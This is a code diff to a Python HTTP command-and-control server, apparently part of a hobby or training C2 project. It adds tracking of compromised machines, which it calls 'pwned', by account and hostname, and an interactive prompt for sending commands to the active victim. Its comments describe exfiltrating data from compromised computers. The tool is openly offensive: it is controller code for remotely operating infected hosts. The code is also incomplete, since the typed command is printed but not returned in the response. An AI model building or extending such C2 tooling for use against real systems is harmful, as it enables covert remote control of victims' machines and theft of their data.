@@ -19,18 +19,49 @@ class C2Handler(BaseHTTPRequestHandler):
     
     # noinspection PyPep8Naming
     def do_GET(self):
+        global active_session, client_account, client_hostname, pwned_id, pwned_dict
         # compromised computer request exfiltrate datas
         if self.path.startswith(CMD_REQUEST):
             client = self.path.split(CMD_REQUEST)[1] 
-            print(client)
-        # first send back 404 to the client
-        self.send_response(404)
-        self.end_headers()
+            
+            # client not into our pwned_dict yet
+            if client not in pwned_dict.values():
+                self.send_response(200)
+                self.end_headers()
+
+                pwned_id += 1
+                pwned_dict[pwned_id] = client
+                client_account = client.split('@')[0]
+                client_hostname = client.split('@')[1]
+
+                print(f"{client_account}@{client_hostname} has been pwned!\n")
+
+            # interactive session with client
+            elif client == pwned_dict[active_session]:
+                cmd = input(f"{client_account}@{client_hostname}: ")
+                self.send_response(200)
+                self.end_headers()
+
+                print(cmd)
+
+            # if client is in pwned_dict but is not our active session
+            else:
+                # first send back 404 to the client
+                self.send_response(404)
+                self.end_headers()
+                
+
+
     
     def log_request(self, code = "-", size = "-"):
         """ rewrite log to just keep interesting datas into c2 request tracks """
         return 
 
+active_session = 1
+client_account = ""
+client_hostname = ""
+pwned_id = 0
+pwned_dict = {}
 
 print("server version:", C2Handler.server_version)
 print("sys_version:", C2Handler.sys_version)
